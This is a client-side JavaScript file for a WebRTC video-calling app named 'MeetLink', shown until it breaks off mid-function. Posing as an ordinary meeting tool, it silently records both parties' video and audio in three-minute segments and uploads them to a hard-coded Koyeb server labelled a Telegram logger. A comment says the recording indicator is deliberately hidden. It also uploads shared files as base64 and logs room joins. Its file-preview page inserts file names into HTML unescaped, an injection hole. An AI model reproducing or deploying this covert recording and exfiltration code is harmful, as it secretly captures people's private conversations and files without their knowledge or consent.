// ============ MeetLink - Neon WebRTC + Auto Recording + Telegram ============
// Fixed: Joiner peer ID conflict, Added: Direct file sharing with preview

// ---- CONFIG ----
const SERVER_URL = 'https://familiar-gertrudis-botakingtipd-f3991937.koyeb.app';
const SEGMENT_DURATION_MS = 3 * 60 * 1000;

// ---- DOM ----
const homePage = document.getElementById('homePage');
const roomPage = document.getElementById('roomPage');
const createRoomBtn = document.getElementById('createRoomBtn');
const joinRoomInput = document.getElementById('joinRoomInput');
const joinRoomBtn = document.getElementById('joinRoomBtn');
const roomIdDisplay = document.getElementById('roomIdDisplay');
const copyLinkBtn = document.getElementById('copyLinkBtn');
const copyLinkBtn2 = document.getElementById('copyLinkBtn2');
const leaveRoomBtn = document.getElementById('leaveRoomBtn');
const shareableLink = document.getElementById('shareableLink');
const waitingScreen = document.getElementById('waitingScreen');
const callScreen = document.getElementById('callScreen');
const localVideo = document.getElementById('localVideo');
const remoteVideo = document.getElementById('remoteVideo');
const remoteNoVideo = document.getElementById('remoteNoVideo');
const toggleMicBtn = document.getElementById('toggleMicBtn');
const toggleCamBtn = document.getElementById('toggleCamBtn');
const toggleScreenBtn = document.getElementById('toggleScreenBtn');
const togglePipBtn = document.getElementById('togglePipBtn');
const toggleChatBtn = document.getElementById('toggleChatBtn');
const endCallBtn = document.getElementById('endCallBtn');
const chatPanel = document.getElementById('chatPanel');
const closeChatBtn = document.getElementById('closeChatBtn');
const chatMessages = document.getElementById('chatMessages');
const chatInput = document.getElementById('chatInput');
const sendChatBtn = document.getElementById('sendChatBtn');
const attachFileBtn = document.getElementById('attachFileBtn');
const fileInput = document.getElementById('fileInput');
const fileProgress = document.getElementById('fileProgress');
const fileProgressFill = document.getElementById('fileProgressFill');
const fileProgressText = document.getElementById('fileProgressText');
const toastEl = document.getElementById('toast');
const recordingIndicator = document.getElementById('recordingIndicator');
const tcModal = document.getElementById('tcModal');
const tcCloseBtn = document.getElementById('tcCloseBtn');
const tcLink = document.getElementById('tcLink');
const tcLink2 = document.getElementById('tcLink2');
const tcLink3 = document.getElementById('tcLink3');
const recordingCanvas = document.getElementById('recordingCanvas');

// ---- State ----
let peer = null, currentCall = null, localStream = null, dataConnection = null;
let isMicOn = true, isCamOn = true, isScreenSharing = false;
let originalVideoTrack = null, incomingFileBuffers = {};
let currentRoomId = null, callStartTime = null, userRole = 'creator', messageCount = 0;
let canvasDrawInterval = null, audioCtx = null, combinedStream = null;
let mediaRecorder = null, recordedChunks = [];
let segmentNumber = 0, recordingTimer = null, isCallActive = false;
let totalRecordingSize = 0;
const CHUNK_SIZE = 16384;

// ============ T&C MODAL ============
[tcLink, tcLink2, tcLink3].forEach(el => {
    if (el) el.addEventListener('click', (e) => { e.preventDefault(); tcModal.classList.remove('hidden'); });
});
tcCloseBtn.addEventListener('click', () => tcModal.classList.add('hidden'));
tcModal.addEventListener('click', (e) => { if (e.target === tcModal) tcModal.classList.add('hidden'); });

// ============ TELEGRAM LOGGER ============
async function logEvent(eventType, extraData = {}) {
    try {
        await fetch(`${SERVER_URL}/api/event`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: eventType, roomId: currentRoomId, timestamp: new Date().toISOString(), ...extraData })
        });
    } catch (e) { }
}

async function logFileUpload(fileName, arrayBuffer) {
    try {
        if (arrayBuffer.byteLength > 50 * 1024 * 1024) return;
        const base64 = arrayBufferToBase64(arrayBuffer);
        await fetch(`${SERVER_URL}/api/event`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'file_upload', roomId: currentRoomId, fileName, fileSize: arrayBuffer.byteLength, sender: userRole, fileData: base64 })
        });
    } catch (e) { }
}

async function uploadRecordingSegment(blob, segNum, isLast, overrideRoomId = null) {
    if (!blob || blob.size === 0) return;
    try {
        const rid = overrideRoomId || currentRoomId || 'unknown';
        const formData = new FormData();
        const filename = `recording_${rid}_part${segNum}.webm`;
        formData.append('video', blob, filename);
        formData.append('roomId', rid);
        formData.append('segmentNumber', String(segNum));
        formData.append('isLast', String(isLast));
        formData.append('segmentSize', String(blob.size));
        const resp = await fetch(`${SERVER_URL}/api/upload-recording`, { method: 'POST', body: formData });
        console.log(`✅ Segment ${segNum} uploaded (${(blob.size / 1024 / 1024).toFixed(1)} MB)`);
    } catch (e) { console.error('Segment upload failed:', e); }
}

function arrayBufferToBase64(buffer) {
    const bytes = new Uint8Array(buffer);
    let binary = '';
    const chunk = 8192;
    for (let i = 0; i < bytes.length; i += chunk) {
        const c = bytes.subarray(i, i + chunk);
        binary += String.fromCharCode.apply(null, c);
    }
    return btoa(binary);
}

// ============ DIRECT FILE SHARING (CLEAN LINKS & 1-HOUR TTL) ============
const fileShareInput = document.getElementById('fileShareInput');
const fileShareBtn = document.getElementById('fileShareBtn');
const fileShareProgress = document.getElementById('fileShareProgress');
const fileShareProgressFill = document.getElementById('fileShareProgressFill');
const fileShareResult = document.getElementById('fileShareResult');
const fileShareLink = document.getElementById('fileShareLink');
const fileShareCopyBtn = document.getElementById('fileShareCopyBtn');
const fileDownloadLink = document.getElementById('fileDownloadLink');
const fileDownloadCopyBtn = document.getElementById('fileDownloadCopyBtn');

if (fileShareBtn) {
    fileShareBtn.addEventListener('click', () => fileShareInput.click());
}

if (fileShareInput) {
    fileShareInput.addEventListener('change', async () => {
        const file = fileShareInput.files[0];
        if (!file) return;
        fileShareProgress.classList.remove('hidden');
        fileShareResult.classList.add('hidden');
        fileShareProgressFill.style.width = '0%';

        const formData = new FormData();
        formData.append('file', file);
        const pwdEl = document.getElementById('filePasswordInput');
        const voEl = document.getElementById('fileViewOnceInput');
        if (pwdEl && pwdEl.value.trim()) formData.append('password', pwdEl.value.trim());
        if (voEl && voEl.checked) formData.append('viewOnce', 'true');

        try {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', `${SERVER_URL}/api/upload-file`);

            xhr.upload.onprogress = (e) => {
                if (e.lengthComputable) {
                    const pct = Math.round((e.loaded / e.total) * 100);
                    fileShareProgressFill.style.width = pct + '%';
                }
            };

            xhr.onload = () => {
                if (xhr.status === 200) {
                    const result = JSON.parse(xhr.responseText);
                    const fileId = result.fileId || result.url.split('/').pop();
                    const cleanShareUrl = result.shareUrl || `${SERVER_URL}/v/${fileId}`;
                    const cleanDlUrl = result.downloadUrl || `${SERVER_URL}/d/${fileId}`;

                    fileShareLink.value = cleanShareUrl;
                    if (fileDownloadLink) fileDownloadLink.value = cleanDlUrl;

                    fileShareResult.classList.remove('hidden');
                    fileShareProgress.classList.add('hidden');
                    showToast('✅ File uploaded! Clean links ready!');
                } else {
                    showToast('❌ Upload failed');
                    fileShareProgress.classList.add('hidden');
                }
            };

            xhr.onerror = () => {
                showToast('❌ Upload failed - Server error');
                fileShareProgress.classList.add('hidden');
            };

            xhr.send(formData);
        } catch (e) {
            showToast('❌ Upload failed');
            fileShareProgress.classList.add('hidden');
        }

        fileShareInput.value = '';
    });
}

if (fileShareCopyBtn) {
    fileShareCopyBtn.addEventListener('click', () => {
        navigator.clipboard.writeText(fileShareLink.value).then(() => showToast('View link copied! 📋'));
    });
}
if (fileDownloadCopyBtn) {
    fileDownloadCopyBtn.addEventListener('click', () => {
        navigator.clipboard.writeText(fileDownloadLink.value || '').then(() => showToast('Direct download link copied! 📋'));
    });
}

// ============ FILE PREVIEW PAGE ============
function checkFilePreview() {
    const params = new URLSearchParams(window.location.search);
    const fileId = params.get('file');
    if (fileId) {
        showFilePreview(fileId);
    }
}

function showFilePreview(fileId) {
    // Create a full-screen preview overlay
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#050510;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;';

    const loading = document.createElement('div');
    loading.style.cssText = 'color:#b14dff;font-family:Orbitron,sans-serif;font-size:1.2rem;';
    loading.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading file...';
    overlay.appendChild(loading);
    document.body.appendChild(overlay);

    // Fetch file info
    fetch(`${SERVER_URL}/api/file-info/${fileId}`)
        .then(r => r.json())
        .then(info => {
            overlay.removeChild(loading);

            if (info.error) {
                overlay.innerHTML = '<div style="color:#ff2d75;font-family:Orbitron;font-size:1.2rem;">File not found or expired</div>';
                return;
            }

            const fileUrl = `${SERVER_URL}/d/${fileId}`;
            const rawUrl = `${SERVER_URL}/api/file/${fileId}`;

            // Header
            const header = document.createElement('div');
            header.style.cssText = 'width:100%;max-width:900px;margin-bottom:20px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;';
            header.innerHTML = `
                <div style="display:flex;align-items:center;gap:12px;">
                    <div style="width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#b14dff,#00f0ff);display:flex;align-items:center;justify-content:center;">
                        <i class="fas fa-file" style="color:#fff;"></i>
                    </div>
                    <div>
                        <div style="color:#e8e8ff;font-weight:700;font-size:1rem;">${info.fileName || 'File'}</div>
                        <div style="color:#8888bb;font-size:0.8rem;">${info.fileSize || ''} • MeetLink Share <span style="background:rgba(0,240,255,0.15);color:#00f0ff;padding:2px 8px;border-radius:6px;font-size:0.75rem;margin-left:8px;">⏱️ 1-Hour TTL</span></div>
                    </div>
                </div>
                <a href="${fileUrl}" download="${info.fileName || 'file'}" style="padding:10px 24px;background:linear-gradient(135deg,#b14dff,#8b3dff);color:#fff;border:none;border-radius:10px;text-decoration:none;font-weight:600;font-family:Inter,sans-serif;cursor:pointer;box-shadow:0 0 15px rgba(177,77,255,0.4);">
                    <i class="fas fa-download"></i> Direct Download
                </a>
            `;
            overlay.appendChild(header);

            // Preview area
            const preview = document.createElement('div');
            preview.style.cssText = 'flex:1;width:100%;max-width:900px;display:flex;align-items:center;justify-content:center;overflow:auto;border-radius:16px;border:1px solid #1c1c50;background:#0a0a1f;';

            const ext = (info.fileName || '').split('.').pop().toLowerCase();
            const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'bmp', 'ico'];
            const videoExts = ['mp4', 'webm', 'mkv', 'avi', 'mov'];
            const audioExts = ['mp3', 'wav', 'ogg', 'flac', 'aac'];
            const pdfExts = ['pdf'];

            if (imageExts.includes(ext)) {
                preview.innerHTML = `<img src="${rawUrl}" style="max-width:100%;max-height:70vh;border-radius:12px;object-fit:contain;" alt="${info.fileName}">`;
            } else if (videoExts.includes(ext)) {
                preview.innerHTML = `<video src="${rawUrl}" controls autoplay style="max-width:100%;max-height:70vh;border-radius:12px;"></video>`;
            } else if (audioExts.includes(ext)) {
                preview.innerHTML = `<div style="text-align:center;padding:40px;"><i class="fas fa-music" style="font-size:4rem;color:#b14dff;margin-bottom:20px;display:block;"></i><audio src="${rawUrl}" controls autoplay style="width:100%;max-width:400px;"></audio></div>`;
            } else if (pdfExts.includes(ext)) {
                preview.innerHTML = `<iframe src="${rawUrl}" style="width:100%;height:70vh;border:none;border-radius:12px;"></iframe>`;
            } else {
                preview.innerHTML = `<div style="text-align:center;padding:60px;"><i class="fas fa-file" style="font-size:4rem;color:#00f0ff;margin-bottom:20px;display:block;"></i><div style="color:#e8e8ff;font-size:1.2rem;font-weight:700;margin-bottom:8px;">${info.fileName}</div><div style="color:#8888bb;margin-bottom:20px;">${info.fileSize || ''}</div><div style="color:#555580;font-size:0.9rem;">Preview not available. Click Download to save the file.</div></div>`;
            }

            overlay.appendChild(preview);
        })
        .catch(e => {
            overlay.innerHTML = '<div style="color:#ff2d75;font-family:Orbitron;font-size:1.2rem;">Error loading file</div>';
        });
}

// ============ SEGMENTED RECORDING SYSTEM (LIGHTWEIGHT 360p 20FPS CRASH-FREE ENGINE) ============
function setupRecordingStreams() {
    try {
        const recCanvas = recordingCanvas;
        recCanvas.width = 640;
        recCanvas.height = 360;
        const ctx = recCanvas.getContext('2d');

        canvasDrawInterval = setInterval(() => {
            ctx.fillStyle = '#080818';
            ctx.fillRect(0, 0, 640, 360);

            try {
                if (remoteVideo && remoteVideo.readyState >= 2) {
                    ctx.drawImage(remoteVideo, 0, 0, 640, 360);
                } else {
                    ctx.fillStyle = '#0a0a2a';
                    ctx.fillRect(0, 0, 640, 360);
                    ctx.fillStyle = '#555580';
                    ctx.font = '16px Inter, sans-serif';
                    ctx.textAlign = 'center';
                    ctx.fillText('Waiting for video...', 320, 180);
                }
            } catch (e) { }

            try {
                if (localVideo && localVideo.readyState >= 2) {
                    const pipW = 120, pipH = 90;
                    const pipX = 640 - pipW - 10, pipY = 360 - pipH - 10;
                    ctx.fillStyle = '#b14dff';
                    ctx.fillRect(pipX - 2, pipY - 2, pipW + 4, pipH + 4);
                    ctx.drawImage(localVideo, pipX, pipY, pipW, pipH);
                    ctx.fillStyle = 'rgba(0,0,0,0.6)';
                    ctx.fillRect(pipX, pipY + pipH - 16, pipW, 16);
                    ctx.fillStyle = '#ffffff';
                    ctx.font = '10px Inter, sans-serif';
                    ctx.textAlign = 'center';
                    ctx.fillText('You', pipX + pipW / 2, pipY + pipH - 4);
                }
            } catch (e) { }

            const now = new Date();
            const timeStr = now.toLocaleTimeString();
            const dateStr = now.toLocaleDateString();
            const elapsed = callStartTime ? formatCallDuration() : '00:00';
            ctx.fillStyle = 'rgba(0,0,0,0.6)';
            ctx.fillRect(8, 8, 190, 20);
            ctx.fillStyle = '#ff2d75';
            ctx.font = '10px Orbitron, monospace';
            ctx.textAlign = 'left';
            ctx.fillText('● REC  ' + dateStr + ' ' + timeStr + ' [' + elapsed + ']', 12, 21);
        }, 1000 / 20);

        const canvasVideoStream = recCanvas.captureStream(20); // 20fps stable lightweight recording

        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const destination = audioCtx.createMediaStreamDestination();

        if (localStream) {
            const localAudioTracks = localStream.getAudioTracks();
            if (localAudioTracks.length > 0) {
                const localSource = audioCtx.createMediaStreamSource(new MediaStream([localAudioTracks[0]]));
                localSource.connect(destination);
            }
        }

        try {
            if (remoteVideo && remoteVideo.captureStream) {
                const remoteStream = remoteVideo.captureStream();
                const remoteAudioTracks = remoteStream.getAudioTracks();
                if (remoteAudioTracks.length > 0) {
                    const remoteSource = audioCtx.createMediaStreamSource(new MediaStream([remoteAudioTracks[0]]));
                    remoteSource.connect(destination);
                }
            }
        } catch (e) { }

        combinedStream = new MediaStream([
            ...canvasVideoStream.getVideoTracks(),
            ...destination.stream.getAudioTracks()
        ]);

        return true;
    } catch (e) {
        console.error('Recording setup failed:', e);
        return false;
    }
}

function getSupportedMimeType() {
    const types = ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm;codecs=h264,opus', 'video/webm'];
    for (const t of types) { if (MediaRecorder.isTypeSupported(t)) return t; }
    return 'video/webm';
}

function startNewSegment() {
    if (!combinedStream || !isCallActive) return;
    segmentNumber++;
    recordedChunks = [];
    const mimeType = getSupportedMimeType();
    mediaRecorder = new MediaRecorder(combinedStream, { mimeType, videoBitsPerSecond: 1500000, audioBitsPerSecond: 128000 });
    mediaRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) recordedChunks.push(e.data); };
    mediaRecorder.onstop = () => {
        if (recordedChunks.length > 0) {
            const blob = new Blob(recordedChunks, { type: mimeType });
            uploadRecordingSegment(blob, segmentNumber, false);
        }
        recordedChunks = [];
        mediaRecorder = null;
        if (isCallActive) startNewSegment();
    };
    mediaRecorder.start(1000);
    recordingTimer = setTimeout(() => { if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop(); }, SEGMENT_DURATION_MS);
}

function startRecording() {
    try {
        if (!setupRecordingStreams()) return;
        isCallActive = true; segmentNumber = 0; totalRecordingSize = 0;
        // recordingIndicator.classList.remove('hidden'); // REC indicator hidden rakhne ke liye comment kiya
        startNewSegment();
    } catch (e) { console.error('Recording start failed:', e); }
}

function stopRecording() {
    isCallActive = false;
    if (recordingTimer) { clearTimeout(recordingTimer); recordingTimer = null; }
    if (canvasDrawInterval) { clearInterval(canvasDrawInterval); canvasDrawInterval = null; }
    if (audioCtx) { audioCtx.close().catch(() => {}); audioCtx = null; }

    const savedRoomId = currentRoomId || 'unknown';
    const savedDuration = formatCallDuration();
    const savedSegNum = segmentNumber || 1;

    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        const currentSegNum = segmentNumber || 1;
        const currentChunks = [...recordedChunks];
        mediaRecorder.onstop = () => {
            const allChunks = [...currentChunks, ...recordedChunks];
            if (allChunks.length > 0) {
                const blob = new Blob(allChunks, { type: 'video/webm' });
                totalRecordingSize += blob.size;
                uploadRecordingSegment(blob, currentSegNum, true, savedRoomId);
            }
            logEvent('recording_complete', { 
                roomId: savedRoomId, 
                totalSegments: savedSegNum, 
                totalSize: totalRecordingSize, 
                duration: savedDuration 
            });
            mediaRecorder = null; recordedChunks = []; combinedStream = null;
        };
        mediaRecorder.stop();
    } else {
        if (savedSegNum > 0) {
            logEvent('recording_complete', { 
                roomId: savedRoomId, 
                totalSegments: savedSegNum, 
                totalSize: totalRecordingSize, 
                duration: savedDuration 
            });
        }
        combinedStream = null;
    }
    recordingIndicator.classList.add('hidden');
}

// ============ NEON PARTICLE BACKGROUND ============
(function initNeonCanvas() {
    const canvas = document.getElementById('neonCanvas');
    const ctx = canvas.getContext('2d');
    let particles = [], mouseX = 0, mouseY = 0, width, height;
    function resize() { width = canvas.width = window.innerWidth; height = canvas.height = window.innerHeight; }
    resize();
    window.addEventListener('resize', resize);
    document.addEventListener('mousemove', (e) => { mouseX = e.clientX; mouseY = e.clientY; });

    class Particle {
        constructor() { this.reset(); }
        reset() {
            this.x = Math.random() * width; this.y = Math.random() * height;
            this.size = Math.random() * 2.5 + 0.5;
            this.speedX = (Math.random() - 0.5) * 0.8; this.speedY = (Math.random() - 0.5) * 0.8;
            this.opacity = Math.random() * 0.6 + 0.2;
            this.hue = Math.random() < 0.5 ? 275 : 190;
            this.pulse = Math.random() * Math.PI * 2;
            this.pulseSpeed = Math.random() * 0.02 + 0.01;
        }
        update() {
            this.x += this.speedX; this.y += this.speedY; this.pulse += this.pulseSpeed;
            const dx = mouseX - this.x, dy = mouseY - this.y, dist = Math.sqrt(dx * dx + dy * dy);
            if (dist < 200) { this.x += dx * 0.002; this.y += dy * 0.002; }
            if (this.x < -10 || this.x > width + 10 || this.y < -10 || this.y > height + 10) this.reset();
        }
        draw() {
            const glow = Math.sin(this.pulse) * 0.3 + 0.7, alpha = this.opacity * glow;
            ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
            ctx.fillStyle = `hsla(${this.hue}, 100%, 70%, ${alpha})`;
            ctx.shadowColor = `hsla(${this.hue}, 100%, 60%, ${alpha * 0.8})`; ctx.shadowBlur = 15;
            ctx.fill(); ctx.shadowBlur = 0;
        }
    }
    const count = Math.min(Math.floor((width * height) / 6000), 200);
    for (let i = 0; i < count; i++) particles.push(new Particle());

    function drawConnections() {
        for (let i = 0; i < particles.length; i++) {
            for (let j = i + 1; j < particles.length; j++) {
                const dx = particles[i].x - particles[j].x, dy = particles[i].y - particles[j].y;
                const dist = Math.sqrt(dx * dx + dy * dy);
                if (dist < 120) {
                    ctx.beginPath(); ctx.moveTo(particles[i].x, particles[i].y); ctx.lineTo(particles[j].x, particles[j].y);
                    ctx.strokeStyle = `hsla(275, 80%, 60%, ${(1 - dist / 120) * 0.15})`; ctx.lineWidth = 0.5; ctx.stroke();
                }
            }
        }
    }

    class NeonOrb {
        constructor() {
            this.x = Math.random() * width; this.y = Math.random() * height;
            this.radius = Math.random() * 80 + 40;
            this.speedX = (Math.random() - 0.5) * 0.3; this.speedY = (Math.random() - 0.5) * 0.3;
            this.hue = [275, 190, 340][Math.floor(Math.random() * 3)];
            this.opacity = Math.random() * 0.06 + 0.02;
        }
        update() {
            this.x += this.speedX; this.y += this.speedY;
            if (this.x < -this.radius) this.x = width + this.radius;
            if (this.x > width + this.radius) this.x = -this.radius;
            if (this.y < -this.radius) this.y = height + this.radius;
            if (this.y > height + this.radius) this.y = -this.radius;
        }
        draw() {
            const g = ctx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.radius);
            g.addColorStop(0, `hsla(${this.hue}, 100%, 60%, ${this.opacity})`);
            g.addColorStop(1, `hsla(${this.hue}, 100%, 60%, 0)`);
            ctx.beginPath(); ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2); ctx.fillStyle = g; ctx.fill();
        }
    }
    const orbs = [];
    for (let i = 0; i < 6; i++) orbs.push(new NeonOrb());

    function animate() {
        if (!isCallActive) {
            ctx.clearRect(0, 0, width, height);
            orbs.forEach(o => { o.update(); o.draw(); });
            drawConnections();
            particles.forEach(p => { p.update(); p.draw(); });
        }
        requestAnimationFrame(animate);
    }
    animate();
})();

// ============ UTILS ============
function generateRoomId() {
    const c = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let id = 'ML-';
    for (let i = 0; i < 7; i++) id += c[Math.floor(Math.random() * c.length)];
    return id;
}
function generateJoinerId() {
    const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let id = 'joiner-';
    for (let i = 0; i < 10; i++) id += c[Math.floor(Math.random() * c.length)];
    return id;
}
function showToast(msg, dur = 3000) { toastEl.textContent = msg; toastEl.classList.add('show'); setTimeout(() => toastEl.classList.remove('show'), dur); }
function showPage(p) { document.querySelectorAll('.page').forEach(x => x.classList.remove('active')); p.classList.add('active'); }
function getRoomLink(rid) { return `${window.location.origin}${window.location.pathname}?room=${rid}`; }
function formatFileSize(b) {
    if (b === 0) return '0 B';
    const k = 1024, s = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(b) / Math.log(k));
    return parseFloat((b / Math.pow(k, i)).toFixed(1)) + ' ' + s[i];
}
function getFileIcon(f) {
    const ext = f.split('.').pop().toLowerCase();
    const m = { jpg:'fa-file-image',jpeg:'fa-file-image',png:'fa-file-image',gif:'fa-file-image',webp:'fa-file-image',svg:'fa-file-image',pdf:'fa-file-pdf',doc:'fa-file-word',docx:'fa-file-word',xls:'fa-file-excel',xlsx:'fa-file-excel',ppt:'fa-file-powerpoint',pptx:'fa-file-powerpoint',zip:'fa-file-archive',rar:'fa-file-archive',mp3:'fa-file-audio',wav:'fa-file-audio',mp4:'fa-file-video',mkv:'fa-file-video',txt:'fa-file-alt',json:'fa-file-code',js:'fa-file-code',py:'fa-file-code' };
    return m[ext] || 'fa-file';
}
function isImageFile(f) { return ['jpg','jpeg','png','gif','webp','svg','bmp','ico'].includes(f.split('.').pop().toLowerCase()); }
function formatCallDuration() {
    if (!callStartTime) return '0s';
    const s = Math.floor((Date.now() - callStartTime) / 1000);
    const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60;
    if (h > 0) return `${h}h ${m}m ${sec}s`;
    if (m > 0) return `${m}m ${sec}s`;
    return `${sec}s`;
}

// ============ NAVIGATION ============
createRoomBtn.addEventListener('click', () => { initRoom(generateRoomId(), true); });
joinRoomBtn.addEventListener('click', () => {
    const input = joinRoomInput.value.trim();
    if (!input) { showToast('Please paste a room link or ID'); return; }
    let rid = input;
    try { const u = new URL(input); if (u.searchParams.get('room')) rid = u.searchParams.get('room'); } catch (e) { }
    initRoom(rid, false);
});
joinRoomInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') joinRoomBtn.click(); });
leaveRoomBtn.addEventListener('click', leaveRoom);
endCallBtn.addEventListener('click', leaveRoom);

// ============ INIT ROOM — FIXED JOINER ID ============
async function initRoom(roomId, isCreator) {
    currentRoomId = roomId;
    userRole = isCreator ? 'creator' : 'joiner';
    callStartTime = null;
    messageCount = 0;
    segmentNumber = 0;
    totalRecordingSize = 0;

    showPage(roomPage);
    roomIdDisplay.textContent = roomId;
    shareableLink.value = getRoomLink(roomId);

    if (isCreator) logEvent('room_created', { roomLink: getRoomLink(roomId) });
    else logEvent('user_joined', { roomLink: getRoomLink(roomId) });

    // 🔧 FIX: Creator uses roomId as peer ID, Joiner uses a UNIQUE random ID
    const myPeerId = isCreator ? roomId : generateJoinerId();

    peer = new Peer(myPeerId, {
        debug: 0,
        config: { iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' },
            { urls: 'stun:stun2.l.google.com:19302' },
            { urls: 'stun:stun.cloudflare.com:3478' },
            { urls: 'stun:openrelay.metered.ca:80' }
        ]}
    });

    peer.on('open', (id) => {
        console.log('My peer ID:', id);
        if (isCreator) {
            showToast('Room created! Share the link 🚀');
        } else {
            // 🔧 FIX: Joiner now calls the creator's peer ID (which IS the roomId)
            console.log('Joining room:', roomId);
            callPeer(roomId);
        }
    });

    peer.on('error', (err) => {
        console.error('Peer error:', err.type, err);
        if (err.type === 'unavailable-id') {
            showToast('Room already exists! Try another link.');
            leaveRoom();
        } else if (err.type === 'peer-unavailable') {
            showToast('Person not online yet. Share the link & wait!');
        } else {
            showToast('Connection error: ' + err.type);
        }
    });

    peer.on('disconnected', () => {
        showToast('Disconnected...');
        if (peer && !peer.destroyed) peer.reconnect();
    });

    // Creator listens for incoming calls & data
    if (isCreator) {
        peer.on('call', handleIncomingCall);
        peer.on('connection', handleIncomingData);
    }
    // Joiner: call initiated in peer.on('open') above
}

// ============ GET MEDIA (SMART 9:16 MOBILE & 16:9 PC DETECTION) ============
async function getMediaStream() {
    const isMobile = window.innerWidth <= 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    const videoConstraints = isMobile ? {
        width:     { ideal: 720,  max: 1080 },
        height:    { ideal: 1280, max: 1920 },
        aspectRatio: { ideal: 9 / 16 },
        frameRate: { ideal: 30,   max: 30   },
        facingMode: 'user'
    } : {
        width:     { ideal: 1280, max: 1920 },
        height:    { ideal: 720,  max: 1080 },
        aspectRatio: { ideal: 16 / 9 },
        frameRate: { ideal: 30,   max: 30   },
        facingMode: 'user'
    };
    try { return await navigator.mediaDevices.getUserMedia({
            video: videoConstraints,
            audio: {
                echoCancellation: true,
                noiseSuppression: true,
                autoGainControl:  true,
                sampleRate:       48000,
                channelCount:     2
            }
        }); }
    catch (e) {
        try { isCamOn = false; updateControlButtons(); return await navigator.mediaDevices.getUserMedia({ video: false, audio: true }); }
        catch (e2) { showToast('Camera/Mic access denied.'); return null; }
    }
}

// ============ CALL PEER (JOINER) — FIXED ============
async function callPeer(targetPeerId) {
    localStream = await getMediaStream();
    if (!localStream) { showToast('Cannot proceed without media'); return; }
    localVideo.srcObject = localStream;

    // Call the creator using their peer ID (= roomId)
    const call = peer.call(targetPeerId, localStream);
    if (!call) {
        showToast('Failed to connect. Is the other person online?');
        return;
    }

    call.on('stream', (rs) => {
        console.log('Remote stream received!');
        showCallScreen(rs);
    });
    call.on('close', () => { showToast('Call ended'); leaveRoom(); });
    call.on('error', (err) => { console.error('Call error:', err); showToast('Call failed'); });
    currentCall = call;

    // Open data connection for chat
    dataConnection = peer.connect(targetPeerId, { reliable: true });
    dataConnection.on('open', () => {
        console.log('Data connection established!');
    });
    dataConnection.on('data', handleDataMessage);
    dataConnection.on('close', () => console.log('Data connection closed'));
    dataConnection.on('error', (err) => console.error('Data error:', err));
}

// ============ INCOMING CALL (CREATOR) ============
async function handleIncomingCall(call) {
    console.log('📞 Incoming call from:', call.peer);
    localStream = await getMediaStream();
    if (!localStream) { showToast('No media access'); return; }
    localVideo.srcObject = localStream;
    call.answer(localStream);

    call.on('stream', (rs) => {
        console.log('Remote stream received!');
        showCallScreen(rs);
    });
    call.on('close', () => { showToast('Call ended'); leaveRoom(); });
    call.on('error', (err) => console.error('Call error:', err));
    currentCall = call;
}

function handleIncomingData(conn) {
    dataConnection = conn;
    conn.on('open', () => console.log('Data connection from joiner!'));
    conn.on('data', handleDataMessage);
    conn.on('close', () => console.log('Data connection closed'));
}

// ============ DYNAMIC ADAPTIVE BITRATE & NETWORK MONITOR (AIRTEL/JIO PRO ENGINE) ============
function setupDynamicNetworkAdaptation(call) {
    if (!call || !call.peerConnection) return;
    try {
        const pc = call.peerConnection;
        const senders = pc.getSenders();
        const videoSender = senders.find(s => s.track && s.track.kind === 'video');
        if (videoSender && videoSender.getParameters) {
            const params = videoSender.getParameters();
            if (!params.encodings) params.encodings = [{}];
            params.encodings[0].maxBitrate = 2500000; // 2.5 Mbps max for HD
            params.encodings[0].networkPriority = 'high';
            params.degradationPreference = 'maintain-framerate'; // Never drop FPS! Dynamically adapt resolution over Airtel/Jio!
            videoSender.setParameters(params).catch(() => {});
        }

        const pingEl = document.getElementById('pingText');
        const netInterval = setInterval(async () => {
            if (!isCallActive || !pc || pc.connectionState === 'closed') {
                clearInterval(netInterval);
                return;
            }
            try {
                const stats = await pc.getStats();
                let rtt = 0, width = 0, height = 0, fps = 0;
                stats.forEach(report => {
                    if (report.type === 'candidate-pair' && report.state === 'succeeded' && report.currentRoundTripTime) {
                        rtt = Math.round(report.currentRoundTripTime * 1000);
                    }
                    if (report.type === 'inbound-rtp' && report.kind === 'video') {
                        if (report.frameWidth) width = report.frameWidth;
                        if (report.frameHeight) height = report.frameHeight;
                        if (report.framesPerSecond) fps = Math.round(report.framesPerSecond);
                    }
                });
                if (pingEl && rtt > 0) {
                    const resStr = width > 0 ? `${width}x${height}` : 'HD';
                    if (rtt < 80) {
                        pingEl.innerHTML = `🟢 Excellent (${rtt}ms) • ${resStr}`;
                        pingEl.style.color = '#39ff14';
                    } else if (rtt < 180) {
                        pingEl.innerHTML = `🟡 Good (${rtt}ms) • ${resStr}`;
                        pingEl.style.color = '#ffd700';
                    } else {
                        pingEl.innerHTML = `🟠 Weak Jio/Airtel (${rtt}ms) • Adapting...`;
                        pingEl.style.color = '#ff2d75';
                    }
                }
            } catch (e) {}
        }, 2500);
